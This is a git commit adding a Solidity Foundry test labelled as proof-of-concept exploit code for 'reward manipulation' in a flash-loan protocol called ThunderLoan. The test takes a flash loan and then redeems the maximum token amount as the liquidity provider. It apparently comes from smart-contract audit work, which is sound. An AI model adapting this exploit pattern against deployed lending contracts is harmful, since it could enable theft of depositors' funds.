15d7c1751807e0f2dfe9932dc35ffe87bc3b9f30
Ashiqur Rahman <98506625+Ashiqur97@users.noreply.github.com>
2024-01-25 00:43:16 +0600

    exploit(reward manipulation)poc code

--- test/unit/ThunderLoanTest.t.sol
+++ test/unit/ThunderLoanTest.t.sol
@@ -87,4 +87,18 @@ contract ThunderLoanTest is BaseTest {
         assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
         assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
     }
+
+    function testRedeemAfterLoan() public setAllowedToken hasDeposits{
+        uint256 amountToBorrow = AMOUNT * 10;
+        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        vm.startPrank(user);
+        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
+        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+
+        uint256 amountToRedeem = type(uint256).max;
+        vm.startPrank(liquidityProvider);
+        thunderLoan.redeem(tokenA, amountToRedeem);
+
+    }
 }
